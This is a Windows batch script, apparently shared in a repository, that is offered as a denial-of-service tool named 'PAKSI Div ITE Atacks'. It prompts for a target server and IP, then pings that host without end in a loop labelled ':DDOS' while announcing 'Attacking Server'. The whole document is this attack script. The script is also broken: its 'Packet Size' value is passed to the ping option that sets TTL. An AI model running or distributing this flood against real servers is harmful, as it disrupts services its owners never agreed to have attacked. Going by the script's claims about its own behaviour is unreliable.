# paksi
testme onli
 @echo off

 

    mode 67,16

 

    title PAKSI Div ITE Atacks

 

    color 0a

 

    cls

 

    echo.

 

    echo Ketua PAKSI Divisi ITE Karya Pribadi

 

    echo =========== IWO SISWO ==============

 

    echo.

 

    echo ===================================================

 

    echo =                    PAKSI                        =

 

    echo =     PUSAT ADVOKASI & PEKERJA SENI INDRAMAYU     =

 

    echo ===================================================

 

    set /p x=Server-Target:

 

    echo.

 

    ping %x%

 

    @ping.exe 127.0.0.1 -n 5 -w 1000 > nul

 

    goto Next

 

    :Next

 

    echo.

 

    echo.

 

    echo.

 

    set /p m=ip Host:

 

    echo.

 

    set /p n=Packet Size:

 

    echo.

 

    :DDOS

 

    color 0c

 

    echo Attacking Server %m%

 

    ping %m% -i %n% -t >nul

 

    goto DDOS
